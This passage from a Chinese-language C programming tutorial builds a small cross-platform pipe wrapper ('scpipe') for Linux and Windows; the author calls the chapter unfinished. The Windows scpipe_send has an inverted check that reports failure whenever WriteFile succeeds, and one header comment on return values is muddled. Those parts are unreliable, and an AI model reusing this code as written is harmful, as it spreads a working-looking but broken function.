        return socket_close(s), socket_close(pipefd[0]), ErrBase;

    return socket_close(s), SufBase;
}
```

    这就保证了创建了两个独有的 socket 进行通信, 伪装成管道的两个读写端. 


### 7.7.1 阅读理解 pipe 

    我们不妨对管道封装一点

scpipe.h

```C
#ifndef _H_SIMPLEC_SCPIPE
#define _H_SIMPLEC_SCPIPE

#include "scsocket.h"

#if defined(_MSC_VER)

//
// pipe - 移植 linux函数, 通过 WinSock
// pipefd	: 索引0表示read, 1表示write
// return	: zero is error, -1 is returned
// 
extern int pipe(socket_t pipefd[2]);

#endif

typedef struct scpipe * scpipe_t;

//
// scpipe_create    - 得到一个父子进程间通信的管道
// scpipe_delete    - 关闭打开的管道
// scpipe_recv      - 管道接收数据, 128K
// scpipe_send      - 管道发送数据, 推荐 BUFSIZ 
//
extern scpipe_t scpipe_create(void);
extern void scpipe_delete(scpipe_t spie);
extern int scpipe_recv(scpipe_t spie, void * data, size_t len);
extern int scpipe_send(scpipe_t spie, const void * data, size_t len);

#endif // !_H_SIMPLEC_SCPIPE
```

    细化了管道的封装, 创建, 销毁, 接收, 发送等. 首先看看 linux 上面封装

```C
struct scpipe {
	int recv;
	int send;
};

scpipe_t 
scpipe_create(void) {
	scpipe_t spie = malloc(sizeof(struct scpipe));
	assert(NULL != spie);

	if (pipe((int *)spie) < 0) {
		free(spie);
		RETURN(NULL, "pipe is error!");
	}

	return spie;
}


void 
scpipe_delete(scpipe_t spie) {
	if (spie) {
		close(spie->recv);
		close(spie->send);
		free(spie);
	}
}

int 
scpipe_recv(scpipe_t spie, void * data, size_t len) {
	ssize_t lrecv = read(spie->recv, data, len);
	if (lrecv < 0) {
		// 不考虑信号中断
		RETURN(ErrBase, "read is error = %ld", lrecv);
	}
	return (int)lrecv;
}

int 
scpipe_send(scpipe_t spie, const void * data, size_t len) {
	ssize_t lsend = write(spie->send, data, len);
	if (lsend < 0) {
		RETURN(ErrBase, "write is error = %ld", lsend);
	}
	return (int)lsend;
}
```

    核心在 pipe 函数上面. 后面只是对器行为的封装. pipefd[0] 接收读取, pipefd[1] 发送.
    对于 winds 封装也是照虎画豹.

```C
struct scpipe {
	HANDLE recv;
	HANDLE send;
};

scpipe_t 
scpipe_create(void) {
	scpipe_t spie = malloc(sizeof (struct scpipe));
	SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
	assert(NULL != spie);
	if (!CreatePipe(&spie->recv, &spie->send, &sa, 0)) {
		free(spie);
		RETURN(NULL, "CreatePipe error!");
	}
	return spie;
}

inline void 
scpipe_delete(scpipe_t spie) {
	if (spie) {
		CloseHandle(spie->recv);
		CloseHandle(spie->send);
		free(spie);
	}
}

int 
scpipe_recv(struct scpipe * spie, void * data, size_t len) {
	DWORD lrecv = 0;
	BOOL ret = PeekNamedPipe(spie->recv, NULL, 0, NULL, &lrecv, NULL);
	if (!ret || lrecv <= 0) {
		RETURN(ErrEmpty, "PeekNamedPipe recv empty error!");
	}

	// 开始读取数据
	ret = ReadFile(spie->recv, data, len, &lrecv, NULL);
	if (!ret) {
		RETURN(ErrBase, "ReadFile is error!");
	}

	return (int)lrecv;
}

int 
scpipe_send(struct scpipe * spie, const void * data, size_t len) {
	DWORD lsend = 0;
	if (WriteFile(spie->send, data, len, &lsend, NULL)) {
		RETURN(ErrBase, "WriteFile is error!");
	}
	return (int)lsend;
}
``` 

    到这里你也许需要下面这个宏包裹一下

```C
#include "scpipe.h"

#ifdef __GNUC__

#elif _MSC_VER

#else
#	error "error : Currently only supports the Best New CL and GCC!"
#endif
```

    到这里基本一套基础的管道协助的库就搭建完毕了. 使用非常简单. 创建后 send 和 recv.

##

    会补充, 这章缺很多东西 ~
